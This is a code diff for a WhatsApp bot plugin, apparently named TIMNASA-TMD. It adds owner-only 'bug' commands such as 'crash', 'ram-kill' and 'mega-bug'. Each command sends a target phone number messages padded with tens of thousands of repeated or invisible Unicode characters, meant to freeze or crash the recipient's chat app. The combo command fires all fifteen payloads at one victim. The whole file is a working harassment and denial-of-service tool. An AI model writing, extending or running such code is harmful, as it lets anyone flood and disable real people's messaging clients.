@@ -2,94 +2,114 @@
 
 const { zokou } = require("../framework/zokou");
 
-// Specialized characters for bugging (Virus strings)
-const bugChar = "⹘".repeat(10000);
-const invisibleChar = "‎".repeat(15000);
+// ==========================================
+// TIMNASA-TMD ELITE VIRUS PAYLOADS (HEAVY)
+// ==========================================
+const v1 = "❑".repeat(30000);
+const v2 = "҈".repeat(35000);
+const v3 = "⁗".repeat(25000);
+const v4 = "☵".repeat(20000);
+const v5 = "░".repeat(45000);
+const v6 = "ꦿ".repeat(32000);
+const ghost = "‎".repeat(60000); // Invisible freeze
 
-// 1. CRASH COMMAND (Lags the chat interface)
+const channelJid = "120363406146813524@newsletter";
+
+// Funsheni ya kutuma shambulio
+async function sendAttack(zk, target, payload) {
+    let jid = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    await zk.sendMessage(jid, { text: payload });
+}
+
+// Orodha ya Amri 15 za Bug
+const bugList = [
+    { nom: "crash", react: "🔥", payload: `𝚃𝙸𝙼𝙽𝙰𝚂𝙰-𝚃𝙼𝙳 𝙳𝙴𝚂𝚃𝚁𝚄𝙲𝚃𝙸𝙾𝙽\n${v1}` },
+    { nom: "bin", react: "👾", payload: `𝟶𝟷𝟶𝟷𝟶𝟷𝟶𝟷-𝚅𝙸𝚁𝚄𝚂-𝙱𝙸𝙽\n${v2}` },
+    { nom: "ui-bug", react: "⚠️", payload: `𝚄𝙸-𝙵𝚁𝙴𝙴𝚉𝙴-𝙰𝚃𝚃𝙰𝙲𝙺\n${v3}` },
+    { nom: "total-freeze", react: "🥶", payload: `𝚂𝚈𝚂𝚃𝙴𝙼-𝚂𝚃𝙾𝙿\n${v4}` },
+    { nom: "heavy-wa", react: "💣", payload: `𝙱𝙾𝙼𝙱-𝙳𝙰𝚃𝙰\n${v5}` },
+    { nom: "lag", react: "⏳", payload: `𝙻𝙰𝙶-𝚂𝚈𝚂𝚃𝙴𝙼-𝟿𝟿𝟿\n${v1}${v2}` },
+    { nom: "dark-web", react: "💀", payload: `𝙳𝙰𝚁𝙺-𝚆𝙴𝙱-𝙴𝚇𝙿𝙻𝙾𝙸𝚃\n${v4}${v5}` },
+    { nom: "ram-kill", react: "🌋", payload: `𝚁𝙰𝙼-𝙴𝚇𝚃𝙴𝚁𝙼𝙸𝙽𝙰𝚃𝙾𝚁\n${v2.repeat(2)}` },
+    { nom: "cpu-heat", react: "♨️", payload: `𝙲𝙿𝚄-𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳\n${v3.repeat(3)}` },
+    { nom: "ghost-bug", react: "👻", payload: `𝙶𝙷𝙾𝚂𝚃-𝙸𝙽𝚅𝙸𝚂𝙸𝙱𝙻𝙴\n${ghost}` },
+    { nom: "payload-x", react: "📡", payload: `𝙿𝙰𝚈𝙻𝙾𝙰𝙳-𝙳𝙰𝚃𝙰-𝚡𝚡𝚡\n${v6}` },
+    { nom: "kernel-error", react: "☣️", payload: `𝙺𝙴𝚁𝙽𝙴𝙻-𝙿𝙰𝙽𝙸𝙲-𝟶𝟶𝟷\n${v1}${v4}` },
+    { nom: "infinite-lag", react: "🌀", payload: `𝙸𝙽𝙵𝙸𝙽𝙸𝚃𝙴-𝙻𝙾𝙾𝙿-𝙱𝚄𝙶\n${v2}${v6}` },
+    { nom: "internal-bug", react: "📂", payload: `𝙸𝙽𝚃𝙴𝚁𝙽𝙰𝙻-𝙵𝙸𝙻𝙴-𝙲𝙾𝚁𝚁𝚄𝙿𝚃\n${v5.repeat(2)}` },
+    { nom: "death-point", react: "⚰️", payload: `𝚃𝙸𝙼𝙽𝙰𝚂𝙰-𝙳𝙴𝙰𝚃𝙷-𝙿𝙾𝙸𝙽𝚃\n${v1}${v3}${v5}` }
+];
+
+// Kutengeneza amri 15 kiotomatiki
+bugList.forEach(bug => {
+    zokou({
+        nomCom: bug.nom,
+        categorie: "Bug-VIP",
+        reaction: bug.react
+    }, async (dest, zk, commandeOptions) => {
+        const { arg, repondre, superUser, ms } = commandeOptions;
+
+        if (!superUser) return repondre("❌ Owner Only.");
+        if (!arg[0]) return repondre(`*Usage:* .${bug.nom} 2557xxx`);
+
+        const target = arg[0];
+        repondre(`🚀 *Attacking ${target} with ${bug.nom.toUpperCase()}...*`);
+
+        try {
+            await sendAttack(zk, target, bug.payload);
+            await zk.sendMessage(dest, {
+                text: `✅ *Attack Successful!*`,
+                contextInfo: {
+                    forwardingScore: 999,
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: channelJid,
+                        newsletterName: "𝚃𝙸𝙼𝙽𝙰𝚂𝙰 𝚃𝙼𝙳 𝙱𝚄𝙶 𝚂𝚈𝚂𝚃𝙴𝙼",
+                        serverMessageId: 1
+                    }
+                }
+            }, { quoted: ms });
+        } catch (e) { repondre("❌ Error."); }
+    });
+});
+
+// ==========================================
+// 16. MEGA-BUG COMMAND (THE ULTIMATE COMBO)
+// ==========================================
 zokou({
-    nomCom: "crash",
-    categorie: "Bug",
-    reaction: "🔥"
+    nomCom: "mega-bug",
+    categorie: "Bug-VIP",
+    reaction: "💀"
 }, async (dest, zk, commandeOptions) => {
-    const { repondre, superUser } = commandeOptions;
+    const { arg, repondre, superUser, ms } = commandeOptions;
 
-    if (!superUser) return repondre("❌ This command is for the Owner only.");
+    if (!superUser) return repondre("❌ Owner Only.");
+    if (!arg[0]) return repondre(`*Usage:* .mega-bug 2557xxx`);
+
+    const targetNum = arg[0];
+    const targetJid = targetNum.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
-    await zk.sendMessage(dest, { 
-        text: `𝚃𝙸𝙼𝙽𝙰𝚂𝙰-𝚃𝙼𝙳 𝙲𝚁𝙰𝚂𝙷 𝚂𝚈𝚂𝚃𝙴𝙼\n${bugChar}` 
-    });
-});
+    repondre(`☣️ *TIMNASA-MD ULTIMATE COMBO:* Launching all 15 viruses to ${targetNum}...`);
 
-// 2. BIN COMMAND (Binary Attack - Makes the chat extremely heavy)
-zokou({
-    nomCom: "bin",
-    categorie: "Bug",
-    reaction: "👾"
-}, async (dest, zk, commandeOptions) => {
-    const { repondre, superUser } = commandeOptions;
+    try {
+        for (const bug of bugList) {
+            await sendAttack(zk, targetNum, bug.payload);
+            await new Promise(resolve => setTimeout(resolve, 800)); // Delay ya usalama kwa bot
+        }
 
-    if (!superUser) return repondre("❌ This command is for the Owner only.");
+        await zk.sendMessage(dest, {
+            text: `💀 *MEGA-BUG COMPLETED!* \nTarget @${targetNum} has been neutralized with 15 heavy payloads.`,
+            mentions: [targetJid],
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: channelJid,
+                    newsletterName: "𝚃𝙸𝙼𝙽𝙰𝚂𝙰 𝚃𝙼𝙳 𝙳𝙴𝙰𝚃𝙷-𝚂𝚀𝚄𝙰𝙳",
+                    serverMessageId: 1
+                }
+            }
+        }, { quoted: ms });
 
-    let binaryData = "";
-    for (let i = 0; i < 5000; i++) {
-        binaryData += "01010110 01101001 01110010 01110101 01110011 ";
-    }
-
-    await zk.sendMessage(dest, { text: binaryData });
-});
-
-// 3. UI-BUG COMMAND (Distorts the Chat Interface)
-zokou({
-    nomCom: "ui-bug",
-    categorie: "Bug",
-    reaction: "⚠️"
-}, async (dest, zk, commandeOptions) => {
-    const { repondre, superUser } = commandeOptions;
-
-    if (!superUser) return repondre("❌ This command is for the Owner only.");
-
-    await zk.sendMessage(dest, { 
-        text: `⚠️ 𝚂𝚈𝚂𝚃𝙴𝙼 𝙴𝚁𝚁𝙾𝚁 ⚠️\n${invisibleChar} 𝚄𝙸 𝙵𝚁𝙴𝙴𝚉𝙴` 
-    });
-});
-
-// 4. TOTAL-FREEZE COMMAND (Corrupted Contact Card Attack)
-zokou({
-    nomCom: "total-freeze",
-    categorie: "Bug",
-    reaction: "🥶"
-}, async (dest, zk, commandeOptions) => {
-    const { repondre, superUser } = commandeOptions;
-
-    if (!superUser) return repondre("❌ This command is for the Owner only.");
-
-    const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 
-                  'FN:𝚃𝙸𝙼𝙽𝙰𝚂𝙰 𝚃𝙼𝙳 𝙳𝙴𝙰𝚃𝙷\n' + 
-                  'ORG:Crash System;\n' + 
-                  'TEL;type=CELL;type=VOICE;waid=255743706043:+255 743 706 043\n' + 
-                  'END:VCARD';
-
-    await zk.sendMessage(dest, { 
-        contacts: { 
-            displayName: '𝚃𝙸𝙼𝙽𝙰𝚂𝙰-𝚃𝙼𝙳 𝙵𝚁𝙴𝙴𝚉𝙴', 
-            contacts: [{ vcard }] 
-        } 
-    });
-});
-
-// 5. HEAVY-WA COMMAND (Emoji Overload - RAM Stress Test)
-zokou({
-    nomCom: "heavy-wa",
-    categorie: "Bug",
-    reaction: "💣"
-}, async (dest, zk, commandeOptions) => {
-    const { repondre, superUser } = commandeOptions;
-
-    if (!superUser) return repondre("❌ This command is for the Owner only.");
-
-    const heavyEmoji = "🔥".repeat(20000);
-    await zk.sendMessage(dest, { 
-        text: `𝙱𝙾𝙼𝙱 𝙰𝚃𝚃𝙰𝙲𝙺:\n${heavyEmoji}` 
-    });
+    } catch (e) { repondre("❌ Mega-attack failed."); }
 });
